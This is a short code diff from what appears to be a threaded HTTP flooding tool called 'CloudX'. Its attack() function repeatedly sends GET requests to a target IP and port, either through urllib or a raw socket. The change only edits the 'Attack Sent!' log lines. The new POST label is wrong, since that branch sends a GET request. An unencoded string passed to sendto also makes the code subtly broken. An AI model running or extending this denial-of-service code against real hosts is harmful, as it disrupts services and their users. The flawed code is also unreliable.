@@ -126,13 +126,13 @@ def attack(ip, port, threadNum):
         try:
             if method  == "GET":
                 urlsocket_file = urllib.request.urlopen(request)
-                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
+                print("[*] Thread (%s) | Attack Sent! [METHOD:GET]" % (threadNum))
             else:
                 s.connect((ip, int(port)))
                 s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
                 s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
                 s.close()
-                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
+                print("[*] Thread (%s) | Attack Sent! [METHOD:POST]" % (threadNum))
         except urllib.error.URLError as e:
             print("[*] Thread (%s) | Error! CloudX can't reach the target URL!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
